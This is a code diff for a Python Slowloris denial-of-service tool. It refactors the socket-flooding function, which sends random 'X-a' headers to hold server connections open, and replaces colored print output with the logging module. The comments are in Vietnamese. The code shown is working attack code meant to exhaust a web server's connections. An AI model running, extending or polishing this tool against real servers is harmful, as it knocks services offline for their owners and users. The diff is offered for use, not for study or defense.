@@ -2,10 +2,14 @@
 
 import random
 import socket
+import logging
 from colorama import Fore as F
 
+# Cấu hình logging
+logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
 def flood(sock: socket.SocketType) -> None:
-    """Keep the sockets alive in Slowloris flood.
+    """Keep the socket alive in a Slowloris flood attack.
 
     Args:
         sock (socket.SocketType): The socket to be kept alive.
@@ -21,17 +25,14 @@ def flood(sock: socket.SocketType) -> None:
         random_header = random.randint(1, 5000)
         sock.send(f"X-a: {random_header}\r\n".encode("utf-8"))
         
-        # In thông báo header đã gửi
-        header_sent = f"{F.RESET} Header Sent:{F.BLUE} X-a {random_header:>4}"
-        print(
-            f"{F.RESET} --> Socket: {F.BLUE}{laddr}:{port} {F.RESET}|{header_sent} {F.RESET}"
-        )
+        # Tạo thông báo cho header đã gửi
+        header_sent = f"Header Sent: X-a {random_header:>4}"
+        logging.info("Socket: %s:%s | %s", laddr, port, header_sent)
         
     except (BrokenPipeError, socket.error) as e:
-        print(f"{F.RED}[!] Socket error: {e}{F.RESET}")
+        logging.error("%s[!] Socket error: %s%s", F.RED, e, F.RESET)
         try:
-            # Đóng socket nếu có lỗi
             sock.close()
+            logging.info("Socket closed successfully.")
         except Exception as close_err:
-            print(f"{F.RED}[!] Error closing socket: {close_err}{F.RESET}")
-
+            logging.error("%s[!] Error closing socket: %s%s", F.RED, close_err, F.RESET)
